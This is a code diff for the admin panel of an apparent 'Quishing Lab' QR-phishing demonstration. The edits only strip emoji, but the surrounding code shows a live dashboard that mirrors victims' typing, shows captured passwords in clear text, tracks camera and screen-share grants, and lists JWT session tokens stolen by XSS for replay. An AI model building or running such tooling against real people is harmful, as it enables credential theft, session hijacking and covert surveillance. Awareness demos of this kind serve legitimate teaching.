@@ -10,7 +10,7 @@
 <body class="admin">
 <div id="gate" class="gate" hidden>
   <div class="gatebox">
-    <h1>🔐 Acceso al panel</h1>
+    <h1>Acceso al panel</h1>
     <input id="inpToken" type="password" placeholder="token de administrador">
     <button id="saveToken" class="cta">Entrar</button>
     <p id="gateErr" class="err"></p>
@@ -19,11 +19,11 @@
 
 <div id="panel" hidden>
   <header>
-    <h1>🕳️ QUISHING LAB <span class="live">● EN VIVO</span></h1>
+    <h1>QUISHING LAB <span class="live">EN VIVO</span></h1>
     <div class="controls">
-      <button id="btnReveal" class="danger">🚨 REVELAR</button>
-      <button id="btnReset" class="ghost">↺ Reiniciar</button>
-      <button id="btnFS" class="ghost">⛶ Pantalla completa</button>
+      <button id="btnReveal" class="danger">REVELAR</button>
+      <button id="btnReset" class="ghost">Reiniciar</button>
+      <button id="btnFS" class="ghost">Pantalla completa</button>
     </div>
   </header>
 
@@ -33,16 +33,16 @@
 
   <section class="bottom">
     <div class="feedbox">
-      <h2>📡 Eventos en tiempo real</h2>
+      <h2>Eventos en tiempo real</h2>
       <div id="feed" class="feed"></div>
-      <h2 class="loothead">🔥 Botín (sesiones robadas)</h2>
+      <h2 class="loothead">Botín (sesiones robadas)</h2>
       <table class="loot">
         <thead><tr><th>Hora</th><th>Origen</th><th>Víctima</th><th>Token (click copia)</th></tr></thead>
         <tbody id="lootRows"></tbody>
       </table>
     </div>
     <div class="qrbox">
-      <h2>🔗 QR del concurso</h2>
+      <h2>QR del concurso</h2>
       <input id="inpURL" placeholder="https://tu-tunel.trycloudflare.com">
       <button id="btnQR" class="cta">Generar QR</button>
       <div id="qr" class="qr"></div>
@@ -51,20 +51,20 @@
 
   <section class="arsenal">
     <div class="qrbox">
-      <h2>1️⃣ Cebo — la "tienda"</h2>
+      <h2>1. Cebo — la "tienda"</h2>
       <p class="hint">La víctima se registra e inicia sesión aquí. Todo parece legítimo.</p>
       <div id="qr1" class="qr mini"></div>
       <div class="urlview" id="url1"></div>
     </div>
     <div class="qrbox">
-      <h2>2️⃣ Robo de sesión (XSS)</h2>
+      <h2>2. Robo de sesión (XSS)</h2>
       <p class="hint">Con la sesión iniciada, ejecuta el payload y manda el JWT al panel.</p>
       <div id="qr2" class="qr mini"></div>
       <div class="urlview" id="url2"></div>
-      <button id="btnCopy2" class="ghost">📋 Copiar URL</button>
+      <button id="btnCopy2" class="ghost">Copiar URL</button>
     </div>
     <div class="qrbox">
-      <h2>3️⃣ Libre (SQLi u otro)</h2>
+      <h2>3. Libre (SQLi u otro)</h2>
       <p class="hint">Pega tu URL malicioso (p. ej. la UNION de Juice Shop).</p>
       <input id="inpURL3" placeholder="http://IP:4000/rest/products/search?q=…">
       <button id="btnQR3" class="cta">Generar QR</button>
@@ -126,7 +126,6 @@ async function start() {
 }
 
 // UI copy for each event type (keys = English event names from the server).
-const EVENT_EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', cookies_collected: '🍪', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋', loot_received: '🦠' };
 const EVENT_TEXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', cookies_collected: 'cookies visibles', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada', loot_received: 'payload XSS ejecutado' };
 
 // Per-session live state (typing mirror + latest screen frame). Arrives over
@@ -163,9 +162,9 @@ async function refresh() {
   const counters = payload.counters;
   $('counters').innerHTML = [
     ['Visitas', counters.visits], ['Credenciales', counters.logins],
-    ['Pidió cámara', counters.cameraRequests], ['Cámara ✔', counters.cameraGranted], ['Cámara ✘', counters.cameraDenied],
-    ['Pantallas 🖥️', counters.screens || 0],
-    ['XSS ejecutado', counters.lootExecutions || 0], ['🔥 Sesiones robadas', counters.lootStolen || 0]
+    ['Pidió cámara', counters.cameraRequests], ['Cámara OK', counters.cameraGranted], ['Cámara rechazada', counters.cameraDenied],
+    ['Pantallas', counters.screens || 0],
+    ['XSS ejecutado', counters.lootExecutions || 0], ['Sesiones robadas', counters.lootStolen || 0]
   ].map(entry => '<div class="counter"><div class="num">' + entry[1] + '</div><div class="lbl">' + entry[0] + '</div></div>').join('');
 
   const sessions = payload.sessions.slice().sort((a, b) => a.last_seen - b.last_seen);
@@ -176,19 +175,19 @@ async function refresh() {
   $('cards').innerHTML = sessions.length ? sessions.map(s => {
     const state = liveState[s.id] || {};
     const mirror = state.mirror || (s.data && s.data.mirror) || {};
-    let statusText = '👀 En landing';
-    if (s.stage === 'revealed') { statusText = '🎭 Revelado'; }
-    else if (s.data && s.data.share === 'sharing') { statusText = '🖥️ Compartiendo pantalla'; }
-    else if (s.data && s.data.cam === 'preview_active') { statusText = '🎥 Cámara activa'; }
-    else if (s.data && s.data.cam === 'denied') { statusText = '🚫 Cámara rechazada'; }
-    else if (s.data && s.data.login) { statusText = '🔑 Login capturado'; }
+    let statusText = 'En landing';
+    if (s.stage === 'revealed') { statusText = 'Revelado'; }
+    else if (s.data && s.data.share === 'sharing') { statusText = 'Compartiendo pantalla'; }
+    else if (s.data && s.data.cam === 'preview_active') { statusText = 'Cámara activa'; }
+    else if (s.data && s.data.cam === 'denied') { statusText = 'Cámara rechazada'; }
+    else if (s.data && s.data.login) { statusText = 'Login capturado'; }
     const meta = '<small>' + escapeHtml(s.os) + ' · ' + escapeHtml(s.browser) + '</small>';
     const maskedPassword = mirror.pass ? '•'.repeat(mirror.pass.length) + '  (' + escapeHtml(mirror.pass) + ')' : '—';
     const mirrorBlock =
       '<div class="mirror">' +
         '<div class="mrow">Sección: <b id="sec-' + s.id + '">' + escapeHtml(SECTION_TEXT[mirror.section] || mirror.section || '—') + '</b></div>' +
-        '<div class="mrow">📧 <span id="mem-' + s.id + '">' + (escapeHtml(mirror.email) || '—') + '</span></div>' +
-        '<div class="mrow">🔑 <span id="mpw-' + s.id + '">' + maskedPassword + '</span></div>' +
+        '<div class="mrow">Email: <span id="mem-' + s.id + '">' + (escapeHtml(mirror.email) || '—') + '</span></div>' +
+        '<div class="mrow">Pass: <span id="mpw-' + s.id + '">' + maskedPassword + '</span></div>' +
       '</div>';
     const hasFrame = !!state.frame;
     const frameBlock =
@@ -200,14 +199,14 @@ async function refresh() {
   $('feed').innerHTML = payload.events.map(event => {
     let extra = '';
     if (event.payload) {
-      if (event.payload.email) extra += ' · 📧 ' + event.payload.email;
-      if (event.payload.password) extra += ' · 🔑 pass="' + event.payload.password + '"';
+      if (event.payload.email) extra += ' · email: ' + event.payload.email;
+      if (event.payload.password) extra += ' · pass="' + event.payload.password + '"';
       if (event.payload.field) extra += ' · ' + event.payload.field + ' (' + event.payload.len + ' chars)';
     }
     const time = new Date(event.created_at).toLocaleTimeString();
     const stolen = event.type === 'loot_received' && event.payload && event.payload.stolen;
-    const text = stolen ? '🔥 SESIÓN ROBADA' : (EVENT_TEXT[event.type] || event.type);
-    return '<div class="ev ' + (event.type === 'fake_login_submitted' || stolen ? 'hot' : '') + '"><span class="t">' + time + '</span> ' + (EVENT_EMOJI[event.type] || '•') + ' <b>' + (event.label || '—') + '</b> ' + text + extra + '</div>';
+    const text = stolen ? 'SESIÓN ROBADA' : (EVENT_TEXT[event.type] || event.type);
+    return '<div class="ev ' + (event.type === 'fake_login_submitted' || stolen ? 'hot' : '') + '"><span class="t">' + time + '</span> <b>' + (event.label || '—') + '</b> ' + text + extra + '</div>';
   }).join('');
 
   const loots = payload.loots || [];
@@ -262,15 +261,15 @@ $('btnCopy2').onclick = () => {
   const url = $('url2').textContent;
   if (!url) return;
   navigator.clipboard.writeText(url).then(() => {
-    $('btnCopy2').textContent = '✔ Copiado';
-    setTimeout(() => { $('btnCopy2').textContent = '📋 Copiar URL'; }, 1500);
+    $('btnCopy2').textContent = 'Copiado';
+    setTimeout(() => { $('btnCopy2').textContent = 'Copiar URL'; }, 1500);
   });
 };
 // Clicking a token in the loot table copies the full JWT (for the replay finale).
 $('lootRows').addEventListener('click', event => {
   const target = event.target.closest('.tok');
   if (!target) return;
-  navigator.clipboard.writeText(target.dataset.tok).then(() => { target.textContent = '✔ copiado'; });
+  navigator.clipboard.writeText(target.dataset.tok).then(() => { target.textContent = 'copiado'; });
 });
 start();
 </script>
